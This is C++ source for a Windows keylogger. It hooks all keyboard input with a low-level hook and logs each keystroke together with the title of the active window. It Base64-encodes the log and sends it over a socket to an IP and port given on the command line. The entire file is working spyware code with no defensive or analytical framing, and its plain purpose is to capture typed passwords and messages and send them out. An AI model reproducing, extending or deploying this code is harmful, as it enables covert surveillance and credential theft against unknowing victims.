#define WIN32_LEAN_AND_MEAN

#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include "Client.h"
#include "Base64.h"
#include "Konoha.h"

HWND prevWindow;
HHOOK keyboardHook;
std::wstring keylog = L"";
Client client;
macaron::Base64 base64;
char ip[12];
LPCSTR Port;
Konoha konoha;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	wchar_t title[256];
	bool isUppercase = false;
	HWND fwindow = GetForegroundWindow();
	KBDLLHOOKSTRUCT *key = (KBDLLHOOKSTRUCT *)lParam;
	//a key was pressed

	if (wParam == WM_KEYDOWN && nCode == HC_ACTION)
	{
		if (prevWindow != fwindow)
		{
			GetWindowText(fwindow, title, 256);
			keylog += L"\n";
			keylog += title;
			keylog += L"\n";
			prevWindow = fwindow;
			//
		}

		isUppercase = (GetKeyState(VK_LSHIFT) & 0x8000);
		isUppercase ^= (GetKeyState(VK_CAPITAL) & 0x0001);

		switch (key->vkCode)
		{
		case VK_TAB:
			keylog += L"[TAB]";
			break;
		case VK_RETURN:
			keylog += L"\n";
			break;
		case VK_LSHIFT:
			keylog += L"[LEFT SHIFT]";
			break;
		case VK_LCONTROL:
			keylog += L"[LEFT CTRL]";
			break;
		case VK_LEFT:
			keylog += L"[LEFT]";
			break;
		case VK_RIGHT:
			keylog += L"[RIGHT]";
			break;
		case VK_UP:
			keylog += L"[UP]";
			break;
		case VK_DOWN:
			keylog += L"[DOWN]";
			break;
		case VK_CAPITAL:
			keylog += L"[CAPS LOCK]";
			break;
		case VK_MENU:
			keylog += L"[ALT]";
			break;
		case VK_OEM_PERIOD:
			keylog += L".";
			break;
		case VK_OEM_MINUS:
			keylog += L"-";
			break;
		case VK_OEM_COMMA:
			keylog += L",";
			break;
		case VK_OEM_PLUS:
			keylog += L"+";
			break;
		default:
			if (!isUppercase)
				keylog += tolower(key->vkCode);
			else keylog += key->vkCode;
			break;
		}
	}
	if (!client.isConnected() )
	{
		client.Connect(ip, Port);
	}
	else if (keylog.length() > 0)
	{
		//wstring -> string -> base64(string)
		string text = konoha.wstring_to_utf8(keylog);
		text = base64.Encode(text);
		//Sleep(500);
		client.Send(text);
		//client.Send(konoha.wstring_to_utf8(keylog));
		keylog = L"";
	}
	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

void onInit()
{
	wstring path = konoha.getPathCurrent();
	
}

int main(int argc, char **argv)
{
	
	if (argc == 1)
	{
		puts("where ip and port ?");
		return -1;
	}
	//onInit();
	strcpy_s(ip, argv[1]);
	Port = argv[2];
	client.Connect(ip, Port);

	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);
	MSG msg{ 0 };
	//a very long loop
	while (GetMessage(&msg, NULL, 0, 0) != 0);
	
	client.Shutdown();
	UnhookWindowsHookEx(keyboardHook);
	return 0;
}